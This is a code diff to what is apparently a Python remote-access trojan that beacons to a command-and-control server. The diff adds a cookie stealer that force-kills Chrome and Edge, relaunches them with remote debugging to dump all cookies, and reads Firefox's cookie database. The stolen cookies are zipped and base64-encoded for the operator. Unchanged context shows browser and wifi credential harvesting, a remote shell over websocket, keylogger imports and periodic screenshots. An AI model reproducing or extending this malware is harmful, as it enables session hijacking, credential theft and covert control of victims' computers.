@@ -1,14 +1,14 @@
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import os
 import sys
+import subprocess
+import importlib
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import json
 import base64
 import sqlite3
 import time
 import platform
-import subprocess
-import random
 import io
 import logging
 from Crypto.Cipher import AES
@@ -28,13 +28,16 @@ from pynput import keyboard
 import configparser
 import xml.etree.ElementTree as ET
 import socketio
+import websocket
+import zipfile
+import random
 
 # ======================
 # Configuration
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.16.78:443"
+        self.C2_SERVER = "https://192.168.147.1"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -42,6 +45,8 @@ class Config:
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
+        self.TAKE_SCREENSHOTS = True
+        self.SCREENSHOT_FREQUENCY = 10
 
 # ======================
 # Encryption
@@ -68,7 +73,7 @@ class Crypto:
         return json.loads(unpad(pt, AES.block_size))
 
 # ======================
-# Credential Harvesting
+# Credential Harvester
 # ======================
 class CredentialHarvester:
     @staticmethod
@@ -208,6 +213,164 @@ class CredentialHarvester:
             return wifi_passwords
         except:
             return []
+
+# ======================
+# Cookie Stealer
+# ======================
+class CookieStealer:
+    def __init__(self, logger=None):
+        self.logger = logger or self._create_default_logger()
+        self.chrome_debug_port = 9222
+        self.edge_debug_port = 9223
+        self.timeout = 10  # seconds for browser operations
+
+    def _create_default_logger(self):
+        logger = logging.getLogger('CookieStealer')
+        if not logger.handlers:
+            handler = logging.StreamHandler()
+            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+            logger.addHandler(handler)
+            logger.setLevel(logging.INFO)
+        return logger
+
+    def _log(self, level, message):
+        if self.logger:
+            getattr(self.logger, level)(message)
+
+    def _kill_browser(self, process_name):
+        try:
+            subprocess.run(f'taskkill /F /IM {process_name}', shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+    def _start_browser_debug(self, browser_path, port, user_data_dir):
+        try:
+            self._kill_browser(os.path.basename(browser_path))
+            command = [
+                browser_path,
+                f'--remote-debugging-port={port}',
+                '--remote-allow-origins=*',
+                '--headless',
+                f'--user-data-dir={user_data_dir}'
+            ]
+            return subprocess.Popen(command, 
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL)
+        except Exception as e:
+            self._log('error', f"Failed to start browser: {str(e)}")
+            return None
+
+    def _get_cookies_via_debug(self, port):
+        try:
+            debug_url = f'http://localhost:{port}/json'
+            response = requests.get(debug_url, timeout=self.timeout)
+            response.raise_for_status()
+            
+            data = response.json()
+            if not data:
+                return []
+                
+            ws_url = data[0]['webSocketDebuggerUrl']
+            ws = websocket.create_connection(ws_url, timeout=self.timeout)
+            
+            ws.send(json.dumps({
+                'id': 1,
+                'method': 'Network.getAllCookies'
+            }))
+            
+            response = json.loads(ws.recv())
+            return response['result']['cookies']
+            
+        except Exception as e:
+            self._log('error', f"Debug protocol error: {str(e)}")
+            return []
+        finally:
+            if 'ws' in locals():
+                ws.close()
+
+    def steal_cookies(self):
+        results = []
+        
+        # Chrome
+        chrome_proc = self._start_browser_debug(
+            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+            self.chrome_debug_port,
+            rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
+        )
+        
+        if chrome_proc:
+            try:
+                time.sleep(5)  # Wait for browser to start
+                cookies = self._get_cookies_via_debug(self.chrome_debug_port)
+                if cookies:
+                    results.append({
+                        'browser': 'chrome',
+                        'cookies': cookies
+                    })
+            except Exception as e:
+                self._log('error', f"Chrome error: {str(e)}")
+            finally:
+                chrome_proc.terminate()
+                chrome_proc.wait()
+        
+        # Edge
+        edge_proc = self._start_browser_debug(
+            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+            self.edge_debug_port,
+            rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
+        )
+        
+        if edge_proc:
+            try:
+                time.sleep(5)
+                cookies = self._get_cookies_via_debug(self.edge_debug_port)
+                if cookies:
+                    results.append({
+                        'browser': 'edge',
+                        'cookies': cookies
+                    })
+            except Exception as e:
+                self._log('error', f"Edge error: {str(e)}")
+            finally:
+                edge_proc.terminate()
+                edge_proc.wait()
+        
+        # Firefox
+        try:
+            ff_profile = self._find_firefox_profile()
+            if ff_profile:
+                cookies = self._get_firefox_cookies(ff_profile)
+                if cookies:
+                    results.append({
+                        'browser': 'firefox',
+                        'cookies': cookies
+                    })
+        except Exception as e:
+            self._log('error', f"Firefox error: {str(e)}")
+        
+        return results
+
+    def _find_firefox_profile(self):
+        ff_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+        if os.path.exists(ff_path):
+            for profile in os.listdir(ff_path):
+                if profile.endswith('.default-release'):
+                    return os.path.join(ff_path, profile)
+        return None
+
+    def _get_firefox_cookies(self, profile_dir):
+        cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
+        if not os.path.exists(cookies_db):
+            return []
+            
+        try:
+            conn = sqlite3.connect(cookies_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
+            return cursor.fetchall()
+        finally:
+            conn.close()
 
 # ======================
 # System Functions
@@ -614,7 +777,6 @@ class WebSocketClient:
         handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         self.logger.addHandler(handler)
 
-
     def _setup_event_handlers(self):
         """Setup all WebSocket event handlers"""
         @self.socket.on('execute_command', namespace='/terminal')
@@ -644,7 +806,6 @@ class WebSocketClient:
                     'error': f"Command processing error: {str(e)}",
                     'current_dir': self.current_dir
                 }, namespace='/terminal')
-
 
     def connect(self):
         try:
@@ -708,7 +869,6 @@ class WebSocketClient:
             self.logger.error(f"WebSocket connection failed: {str(e)}")
             return False
         
-
     def _execute_command(self, command):
         try:
             self.logger.info(f"Executing: {command}")
@@ -759,6 +919,7 @@ class WebSocketClient:
                 'error': str(e),
                 'current_dir': self.current_dir
             }
+
     def disconnect(self):
         if self.socket:
             try:
@@ -793,6 +954,22 @@ class Agent:
         handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         self.logger.addHandler(handler)
 
+    def _log(self, level, message):
+        if level == 'debug':
+            self.logger.debug(message)
+        elif level == 'info':
+            self.logger.info(message)
+        elif level == 'warning':
+            self.logger.warning(message)
+        elif level == 'error':
+            self.logger.error(message)
+
+    def _log_error(self, message):
+        self.logger.error(message)
+
+    def _log_info(self, message):
+        self.logger.info(message)
+
     def _generate_agent_id(self):
         return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"
 
@@ -816,11 +993,12 @@ class Agent:
             }
             if not self._initial_checkin:
                 self._initial_checkin = time.time()
-
-        if self._checkin_count % 10 == 0:
-            screenshot = SystemUtils.take_screenshot()
-            if screenshot:
-                data["screenshot"] = screenshot
+        
+        if self.config.TAKE_SCREENSHOTS:
+            if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
+                screenshot = SystemUtils.take_screenshot()
+                if screenshot:
+                    data["screenshot"] = screenshot
 
         self._checkin_count += 1
         return data
@@ -828,23 +1006,22 @@ class Agent:
     def _execute_task(self, task):
         try:
             task_type = task.get("type")
-            self.logger.info(f"Received task: {json.dumps(task, indent=2)}")  # Debug logging
+            self._log_info(f"Received task: {json.dumps(task, indent=2)}")
             
             if task_type == "websocket":
-                # Get action from both possible locations in the task structure
                 action = task.get("action") or task.get("data", {}).get("action")
                 if not action:
-                    self.logger.error("WebSocket task missing action parameter")
+                    self._log_error("WebSocket task missing action parameter")
                     return {
                         "status": "error",
                         "message": "WebSocket task requires 'action' parameter"
                     }
                 
-                self.logger.info(f"Processing WebSocket {action} request")
+                self._log_info(f"Processing WebSocket {action} request")
                 
                 if action == "start":
                     if not hasattr(self, 'ws_client') or not self.ws_client:
-                        self.logger.info("Initializing new WebSocket client")
+                        self._log_info("Initializing new WebSocket client")
                         self.ws_client = WebSocketClient(
                             self.agent_id,
                             self.crypto,
@@ -853,7 +1030,7 @@ class Agent:
                         )
                     
                     if not self.ws_client.connected:
-                        self.logger.info("Attempting WebSocket connection...")
+                        self._log_info("Attempting WebSocket connection...")
                         if self.ws_client.connect():
                             return {
                                 "status": "success",
@@ -885,7 +1062,6 @@ class Agent:
                         "message": "No active WebSocket connection",
                         "action": "stop"
                     }
-        
             
             elif task_type == "terminal":
                 command = task.get("cmd", "")
@@ -943,11 +1119,81 @@ class Agent:
             
             elif task_type == "harvest_creds":
                 return {
-                    "browsers": CredentialHarvester.get_chrome_credentials() + 
-                                CredentialHarvester.get_firefox_credentials() + 
-                                CredentialHarvester.get_edge_credentials(),
-                    "wifi": CredentialHarvester.get_wifi_passwords()
+                    "status": "success",
+                    "credentials": {
+                        "browsers": CredentialHarvester.get_chrome_credentials() + 
+                                    CredentialHarvester.get_firefox_credentials() + 
+                                    CredentialHarvester.get_edge_credentials(),
+                        "wifi": CredentialHarvester.get_wifi_passwords()
+                    }
                 }
+            
+            elif task_type == "steal_cookies":
+                try:
+                    self._log_info("Starting cookie stealing task")
+                    stealer = CookieStealer(logger=self.logger)
+                    stolen_cookies = stealer.steal_cookies()
+                    
+                    if not stolen_cookies:
+                        return {
+                            "status": "error",
+                            "message": "No cookies were stolen"
+                        }
+                    
+                    # Package cookies for transmission
+                    packaged = []
+                    temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+                    os.makedirs(temp_dir, exist_ok=True)
+                    
+                    for result in stolen_cookies:
+                        try:
+                            # Create JSON file
+                            cookies_file = os.path.join(temp_dir, f"{result['browser']}_cookies.json")
+                            with open(cookies_file, 'w') as f:
+                                json.dump(result['cookies'], f)
+                            
+                            # Create ZIP file
+                            zip_file = os.path.join(temp_dir, f"{result['browser']}_cookies.zip")
+                            with zipfile.ZipFile(zip_file, 'w') as zipf:
+                                zipf.write(cookies_file, os.path.basename(cookies_file))
+                            
+                            # Read ZIP content
+                            with open(zip_file, 'rb') as f:
+                                zip_content = f.read()
+                            
+                            packaged.append({
+                                'browser': result['browser'],
+                                'zip_content': base64.b64encode(zip_content).decode('utf-8'),
+                                'system_info': SystemUtils.get_system_info()
+                            })
+                            
+                            # Clean up
+                            os.remove(cookies_file)
+                            os.remove(zip_file)
+                            
+                        except Exception as e:
+                            self._log('error', f"Failed to package {result['browser']} cookies: {str(e)}")
+                            continue
+                    
+                    if not packaged:
+                        return {
+                            "status": "error",
+                            "message": "Failed to package any cookies"
+                        }
+                    
+                    return {
+                        "status": "success",
+                        "message": f"Stole cookies from {len(packaged)} browsers",
+                        "results": packaged
+                    }
+                    
+                except Exception as e:
+                    self._log('error', f"Cookie stealing failed: {str(e)}")
+                    return {
+                        "status": "error",
+                        "message": str(e)
+                    }
+
             
             elif task_type == "upload":
                 return SystemUtils.upload_file(task.get("path", ""))
@@ -986,14 +1232,14 @@ class Agent:
                 }
         
         except Exception as e:
-            self.logger.error(f"Error executing task: {str(e)}")
+            self._log_error(f"Error executing task: {str(e)}")
             return {
                 "status": "error",
                 "message": f"Task execution failed: {str(e)}"
             }
 
     def beacon(self):
-        self.logger.info("[*] Starting beacon loop...")
+        self._log_info("[*] Starting beacon loop...")
         while self._running:
             try:
                 sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
@@ -1036,10 +1282,10 @@ class Agent:
                         )
                 
             except requests.exceptions.RequestException as e:
-                self.logger.error(f"Connection error: {str(e)}")
+                self._log_error(f"Connection error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL * 2)
             except Exception as e:
-                self.logger.error(f"Unexpected error: {str(e)}")
+                self._log_error(f"Unexpected error: {str(e)}")
                 time.sleep(self.config.CHECKIN_INTERVAL)
 
     def stop(self):
@@ -1050,7 +1296,7 @@ class Agent:
             self.ws_client.disconnect()
 
     def run(self):
-        self.logger.info("[*] Starting agent...")
+        self._log_info("[*] Starting agent...")
         self.beacon()
 
 if __name__ == "__main__":
